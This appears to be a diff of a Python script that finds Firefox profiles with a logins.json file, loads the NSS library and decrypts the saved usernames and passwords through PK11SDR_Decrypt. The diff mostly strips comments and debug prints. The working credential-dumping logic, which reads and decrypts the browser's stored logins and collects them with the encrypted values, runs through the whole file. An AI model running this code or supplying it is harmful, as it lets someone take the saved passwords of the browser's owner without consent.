@@ -14,10 +14,8 @@ def validprofile():
     valid_profiles = []
     
     for pattern in root_file_paths:
-        # Search for matching profile directories
         for profile_dir in Path.home().glob(pattern):
             if profile_dir.is_dir():
-                # Check if logins.json exists
                 logins_file = profile_dir / "logins.json"
                 if logins_file.exists():
                     valid_profiles.append(profile_dir)
@@ -26,10 +24,8 @@ def validprofile():
     if not valid_profiles:
         raise FileNotFoundError("No Firefox profile with logins.json found!")
     
-    # Return the first valid profile
     return valid_profiles[0]
 
-# Usage
 try:
     profile = validprofile()
     print(f"\nUsing profile: {profile}")
@@ -60,14 +56,13 @@ def load_libnss():
     except:
         pass
     
-    # Fallback to common locations
     locations = [
         "/usr/lib/x86_64-linux-gnu/nss/libnss3.so",
         "/usr/lib/x86_64-linux-gnu/libnss3.so",
         "/usr/lib/firefox/libnss3.so",
         "/usr/lib/libnss3.so",
         "/usr/lib64/libnss3.so",
-        "libnss3.so",  # Let system find it
+        "libnss3.so", 
     ]
     
     for path in locations:
@@ -78,7 +73,7 @@ def load_libnss():
     
     raise Exception("libnss3.so not found! Install: sudo apt install libnss3")
 
-# Use it
+
 libnss = load_libnss()
 
 class SECItem(ct.Structure):
@@ -93,17 +88,12 @@ def decrypt(enc):
     inp = SECItem(0, ct.cast(ct.c_char_p(data), ct.c_void_p), len(data))
     out = SECItem(0, None, 0)
     libnss.PK11SDR_Decrypt(ct.byref(inp), ct.byref(out), None)
-    # print ("data",data)
-    # print ("inp",inp)
-    # print ("out",out)
-    # print("return value is: ",ct.string_at(out.data, out.len).decode() )
     return ct.string_at(out.data, out.len).decode()
 
-# Read logins
+
 with open(profile / "logins.json") as f:
     logins = json.load(f)
 
-# Create output with encrypted AND decrypted
 def getcreds():
     output = []
     for demo in logins['logins']:
